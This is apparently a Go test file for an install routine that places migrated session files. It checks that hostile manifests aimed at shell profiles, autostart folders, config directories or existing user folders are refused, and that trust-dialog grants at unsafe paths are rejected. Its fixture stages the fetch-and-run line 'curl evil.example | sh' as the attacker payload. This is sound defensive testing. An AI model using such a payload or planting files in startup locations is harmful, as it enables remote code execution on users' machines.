// TestInstallRefusesCaptureDstEvenWithHostileStatusMap): even a hostile
// status map that claims staged-same — bypassing Diff's own refusal
// entirely, e.g. via a peer whose Diff is older or simply a bug — must not
// get a pack-category entry installed, target absent or not.
func TestInstallRefusesPackEntryEvenWithHostileStatusMap(t *testing.T) {
	m, staging, p := staged(t)
	victim := 2 // a plain session-category file, repurposed as the attack entry
	if !m.Entries[victim].IsRegular() {
		t.Fatalf("fixture entry %d is not a plain file: %+v", victim, m.Entries[victim])
	}
	target := filepath.Join(p.Home, ".bash_profile") // absent
	m.Entries[victim].Category = session.CatPack
	m.Entries[victim].Dst = target

	st := map[int]Status{}
	for _, e := range m.Entries {
		st[e.ID] = StagedSame
	}
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), target) || !strings.Contains(err.Error(), "pack") {
		t.Fatalf("err = %v, want a pack-entry refusal naming %s", err, target)
	}
	if _, err := os.Lstat(target); !os.IsNotExist(err) {
		t.Errorf("%s must not have been created: lstat err = %v", target, err)
	}
}

// --- Ruling R-P3-B1d: a CatRepo/CatWorktree entry must lie under one of
// the manifest's declared Roots, and each Root must itself pass
// validRoot's containment (under Home, not Home itself, outside
// ConfigDir/DataDir, no dot-prefixed first component) and be fresh
// (absent, or containing only this manifest's own entries). B1c disclosed
// this as the residual gap left open after CatPack was closed — these are
// its regression tests. ---

// rootPoCFixture builds a one-entry CatWorktree manifest declaring root as
// its sole Manifest.Roots entry, with dstRel joined under root as the
// entry's Dst, and stages attacker-controlled bytes under its id. Mirrors
// the PoC style used above for CatPack/CatCapture.
func rootPoCFixture(t *testing.T, home, root, dstRel string) (*Manifest, string, session.Paths, string) {
	t.Helper()
	p := hostPaths(home)
	jobID := "77777777-7777-4777-8777-777777777777"
	staging := job.StagingDir(p.DataDir, jobID)
	dst := filepath.Join(root, dstRel)
	payload := "curl evil.example | sh\n"

	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid, Roots: declRoots(root)}
	m.Entries = []Entry{{
		ID: 0, Category: session.CatWorktree, Dst: dst,
		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
	}}
	writeFile(t, StagedPath(staging, 0), payload)
	return m, staging, p, dst
}

// runRootPoC drives Diff+Install for a rootPoCFixture and asserts the
// entry was refused and never created at Dst.
func runRootPoC(t *testing.T, m *Manifest, staging string, p session.Paths, dst string) {
	t.Helper()
	// R-P3-B1e: Diff diagnoses the refusal (so preflight reports it with
	// the entry and the reason) and Install re-derives it independently —
	// installOrRefuse exercises both, in the order production does.
	err := installOrRefuse(t, m, staging, p)
	if err == nil || !strings.Contains(err.Error(), dst) {
		t.Fatalf("err = %v, want a refusal naming %s", err, dst)
	}
	if !IsRefusal(err) {
		t.Errorf("err = %v, want a *RefusalError", err)
	}
	if _, err := os.Lstat(dst); !os.IsNotExist(err) {
		t.Errorf("%s must not have been created: lstat err = %v", dst, err)
	}
	// Install's own gate, independent of anything Diff said: even a
	// hostile status map claiming staged-same must not get it placed.
	hostile := map[int]Status{}
	for _, e := range m.Entries {
		hostile[e.ID] = StagedSame
	}
	if _, err := Install(context.Background(), m, hostile, staging, p, InstallExtras{}); err == nil {
		t.Fatalf("Install with a hostile status map placed %s", dst)
	}
	if _, err := os.Lstat(dst); !os.IsNotExist(err) {
		t.Errorf("%s must not have been created: lstat err = %v", dst, err)
	}
}

// TestInstallRefusesWorktreeRootIsHomeItself: a worktree entry with
// Root=$HOME and Dst=$HOME/.bash_profile must be refused, and nothing
// created — a Root that IS Home would let a CatWorktree/CatRepo entry
// land literally anywhere under Home.
func TestInstallRefusesWorktreeRootIsHomeItself(t *testing.T) {
	home := t.TempDir()
	m, staging, p, dst := rootPoCFixture(t, home, home, ".bash_profile")
	runRootPoC(t, m, staging, p, dst)
}

// TestInstallRefusesWorktreeRootDotPrefixed: Root=$HOME/.config/autostart
// must be refused — its first path component under Home (".config") is
// dot-prefixed, exactly the shape of the config dirs/dotfiles a shell or
// login manager reads.
func TestInstallRefusesWorktreeRootDotPrefixed(t *testing.T) {
	home := t.TempDir()
	root := filepath.Join(home, ".config", "autostart")
	m, staging, p, dst := rootPoCFixture(t, home, root, "evil.desktop")
	runRootPoC(t, m, staging, p, dst)
}

// TestInstallRefusesWorktreeRootUnderConfigDir: Root=$HOME/.claude (the
// default ConfigDir) must be refused — CatSession already owns that
// space, with its own Forbidden-path checks; a git root must never
// overlap it.
func TestInstallRefusesWorktreeRootUnderConfigDir(t *testing.T) {
	home := t.TempDir()
	root := filepath.Join(home, ".claude")
	m, staging, p, dst := rootPoCFixture(t, home, root, "evil.json")
	runRootPoC(t, m, staging, p, dst)
}

// TestInstallRefusesWorktreeRootWithForeignContent: an otherwise-valid
// Root (under Home, not dot-prefixed, outside ConfigDir/DataDir) that
// already exists and already holds a file the manifest knows nothing
// about must be refused before anything is written, and that pre-existing
// file must survive untouched — a hostile source could otherwise claim
// any of the user's real directories as a Root and smuggle a new file
// into it.
func TestInstallRefusesWorktreeRootWithForeignContent(t *testing.T) {
	home := t.TempDir()
	root := filepath.Join(home, "existing-project")
	if err := os.MkdirAll(root, 0o700); err != nil {
		t.Fatal(err)
	}
	real := filepath.Join(root, "realfile.txt")
	if err := os.WriteFile(real, []byte("the user's own file\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	m, staging, p, dst := rootPoCFixture(t, home, root, "newfile.txt")

	_, err := Diff(context.Background(), m, staging, p)
	if ids := refusedIDs(t, err); len(ids) != 1 || ids[0] != 0 {
		t.Errorf("refused ids = %v, want [0]; err = %v", ids, err)
	}
	if !strings.Contains(err.Error(), "was not created by this job") {
		t.Errorf("refusal reason = %v, want the provenance rule", err)
	}
	runRootPoC(t, m, staging, p, dst)
	got, err := os.ReadFile(real)
	if err != nil || string(got) != "the user's own file\n" {
		t.Errorf("%s must survive untouched: got %q err=%v", real, got, err)
	}
}

// TestInstallInstallsCatWorktreeEntryUnderFreshValidRoot proves the fix
// does not break the legitimate case: a CatWorktree entry under a
// declared Root that is absent (fresh-main's whole premise) installs
// normally.
func TestInstallInstallsCatWorktreeEntryUnderFreshValidRoot(t *testing.T) {
	home := t.TempDir()
	root := filepath.Join(home, "github", "proj")
	m, staging, p, dst := rootPoCFixture(t, home, root, "src.go")

	st, err := Diff(context.Background(), m, staging, p)
	if err != nil {
		t.Fatal(err)
	}
	if st[0] != StagedSame {
		t.Fatalf("status = %s, want %s", st[0], StagedSame)
	}
	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err != nil {
		t.Fatalf("Install: %v", err)
	}
	if rep.Installed != 1 {
		t.Errorf("report = %+v, want Installed 1", rep)
	}
	if _, err := os.Stat(dst); err != nil {
		t.Errorf("%s not installed: %v", dst, err)
	}
}

// TestDiffTreatsThisJobsOwnRootAsInstallable is ruling R-P3-B1e item 3's
// replacement for the old name-subset freshness check (which let a hostile
// manifest INSERT into any directory whose existing files it also listed).
// Freshness is now provenance: once Install has claimed a Root in
// jobs/<id>/roots.json, every later Diff of the same job — verifyInstall's
// re-diff after a successful install, a resumed job's repeated steps —
// still sees the (now legitimately non-empty) Root as its own, while a
// Root this job never created stays refused no matter what the manifest
// lists.
func TestDiffTreatsThisJobsOwnRootAsInstallable(t *testing.T) {
	home := t.TempDir()
	p := hostPaths(home)
	root := filepath.Join(home, "github", "proj")
	jobID := "88888888-8888-4888-8888-888888888888"
	staging := job.StagingDir(p.DataDir, jobID)
	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid, Roots: declRoots(root)}
	m.Entries = []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: filepath.Join(root, "a.go"), Size: 5, Mode: 0o600, SHA256: sha("aaaaa")},
		{ID: 1, Category: session.CatWorktree, Dst: filepath.Join(root, "b.go"), Size: 5, Mode: 0o600, SHA256: sha("bbbbb")},
	}
	// Entry 0 already landed in an earlier successful pass — which is
	// also when that pass claimed the root.
	if err := os.MkdirAll(root, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(m.Entries[0].Dst, []byte("aaaaa"), 0o600); err != nil {
		t.Fatal(err)
	}
	writeFile(t, StagedPath(staging, 1), "bbbbb")

	// Without the provenance record, a populated root is refused.
	if _, err := Diff(context.Background(), m, staging, p); !IsRefusal(err) {
		t.Fatalf("Diff over an unclaimed populated root = %v, want a refusal", err)
	}
	if err := recordJobRoot(p.DataDir, jobID, map[string]bool{}, root); err != nil {
		t.Fatal(err)
	}
	st, err := Diff(context.Background(), m, staging, p)
	if err != nil {
		t.Fatal(err)
	}
	if st[0] != PresentSame {
		t.Errorf("entry 0 (already placed) = %s, want %s", st[0], PresentSame)
	}
	if st[1] != StagedSame {
		t.Errorf("entry 1 (not yet placed, same root) = %s, want %s", st[1], StagedSame)
	}
}

// TestInstallGrantsTrustAtTheMainRepoPath is ruling R-P3-TRUST-1 item 1's
// destination half: when the source's session was trusted under a path
// that is NOT the session cwd (a linked worktree's main repository), the
// destination must grant the trust dialog at that mapped path — the one
// the destination's Claude Code will actually consult — before the start
// step ever types `claude --resume`.
func TestInstallGrantsTrustAtTheMainRepoPath(t *testing.T) {
	m, staging, p := staged(t)
	main := filepath.Join(p.Home, "repo")
	worktree := filepath.Join(main, ".worktrees", "x")
	// The trust may only be granted somewhere the manifest itself names:
	// its own ProjectCwd, or one of the repository roots it declares.
	m.Roots = GitRoots(main, worktree, false)
	st, _ := Diff(context.Background(), m, staging, p)
	extra := InstallExtras{
		ProjectCwd:    worktree,
		TrustCwd:      main,
		SourceTrusted: true,
	}
	rep, err := Install(context.Background(), m, st, staging, p, extra)
	if err != nil {
		t.Fatal(err)
	}
	if !rep.TrustGranted {
		t.Error("TrustGranted = false, want the trust merged on the destination")
	}
	e, ok, err := session.ReadProjectEntry(p.GlobalJSON, main)
	if err != nil || !ok || !session.TrustAccepted(e) {
		t.Fatalf("projects[%q] = %+v (%v %v)", main, e, ok, err)
	}
	// Idempotent: a re-run (continue) grants nothing new. Everything is
	// PresentSame by now, so the re-diff is what a continue really sees.
	st2, _ := Diff(context.Background(), m, staging, p)
	rep2, err := Install(context.Background(), m, st2, staging, p, extra)
	if err != nil {
		t.Fatal(err)
	}
	if rep2.TrustGranted {
		t.Error("TrustGranted = true on a second install: the grant must be idempotent")
	}
}

// TestInstallRefusesTrustOutsideTheManifestsOwnPaths is PR #11 review item
// 3: TrustCwd is source-supplied, so it may only ever name a path this
// manifest already names — its ProjectCwd or one of its declared roots
// (DstMain/DstWorktree). Anything else, however plausible, is refused
// before a single byte of the global config is rewritten.
func TestInstallRefusesTrustOutsideTheManifestsOwnPaths(t *testing.T) {
	m, staging, p := staged(t)
	main := filepath.Join(p.Home, "repo")
	worktree := filepath.Join(main, ".worktrees", "x")
	m.Roots = GitRoots(main, worktree, false)
	for _, bad := range []string{"/etc", filepath.Join(p.Home, "elsewhere"), filepath.Dir(main)} {
		// A fresh diff each pass: an earlier Install in this loop has
		// already moved the staged files into place (the trust grant is
		// the last thing install does), so the statuses have moved on.
		st, _ := Diff(context.Background(), m, staging, p)
		extra := InstallExtras{ProjectCwd: worktree, TrustCwd: bad, SourceTrusted: true}
		if _, err := Install(context.Background(), m, st, staging, p, extra); err == nil {
			t.Errorf("TrustCwd %q was accepted: it is neither the manifest's ProjectCwd nor one of its roots", bad)
		}
		if e, _, err := session.ReadProjectEntry(p.GlobalJSON, bad); err != nil || e != nil {
			t.Errorf("projects[%q] = %v (%v): nothing may be written for a refused trust cwd", bad, e, err)
		}
	}
	// The declared worktree root and the ProjectCwd itself are both fine.
	for _, ok := range []string{worktree, main} {
		st, _ := Diff(context.Background(), m, staging, p)
		extra := InstallExtras{ProjectCwd: worktree, TrustCwd: ok, SourceTrusted: true}
		if _, err := Install(context.Background(), m, st, staging, p, extra); err != nil {
			t.Errorf("TrustCwd %q refused: %v", ok, err)
		}
		if e, found, err := session.ReadProjectEntry(p.GlobalJSON, ok); err != nil || !found || !session.TrustAccepted(e) {
			t.Errorf("projects[%q] = %v %v (%v)", ok, e, found, err)
		}
	}
}

// TestInstallRefusesTrustAtADangerousPath: even a path the manifest names,
// the destination never grants the trust dialog for its own home, config
// dir or data dir.
func TestInstallRefusesTrustAtADangerousPath(t *testing.T) {
	for _, bad := range []string{"", "relative/path", "/home/bob/../bob"} {
		m, staging, p := staged(t)
		st, _ := Diff(context.Background(), m, staging, p)
		extra := InstallExtras{ProjectCwd: filepath.Join(p.Home, "work"), TrustCwd: bad, SourceTrusted: true}
		if _, err := Install(context.Background(), m, st, staging, p, extra); err == nil {
			t.Errorf("TrustCwd %q was accepted", bad)
		}
	}
	for _, bad := range []func(p session.Paths) string{
		func(p session.Paths) string { return p.Home },
		func(p session.Paths) string { return p.ConfigDir },
		func(p session.Paths) string { return p.DataDir },
		func(p session.Paths) string { return "/" },
	} {
		m, staging, p := staged(t)
		// Declared as the manifest's own ProjectCwd, so only the
		// dangerous-path rule can be what refuses it.
		st, _ := Diff(context.Background(), m, staging, p)
		extra := InstallExtras{ProjectCwd: bad(p), TrustCwd: bad(p), SourceTrusted: true}
		if _, err := Install(context.Background(), m, st, staging, p, extra); err == nil {
			t.Errorf("TrustCwd %q was accepted", bad(p))
		}
	}
}
